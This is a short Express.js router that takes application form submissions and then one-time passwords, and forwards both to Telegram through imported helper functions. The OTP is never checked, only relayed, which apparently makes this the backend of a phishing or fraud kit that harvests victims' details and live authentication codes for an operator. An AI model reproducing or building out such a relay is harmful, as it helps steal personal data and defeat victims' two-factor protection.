import express from "express";
import { sendApplicationToTelegram, sendOTPToTelegram } from "../services/telegramServices.js";

const router = express.Router();

// 📩 SUBMIT APPLICATION
router.post("/", async (req, res) => {
  const data = req.body;

  const id = Date.now().toString(); // simple unique ID

  try {
    await sendApplicationToTelegram(id, data);

    res.json({ success: true, id });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to send application" });
  }
});

// 🔐 SUBMIT OTP
router.post("/otp", async (req, res) => {
  const { id, otp } = req.body;

  try {
    await sendOTPToTelegram(id, otp);

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to send OTP" });
  }
});

export default router;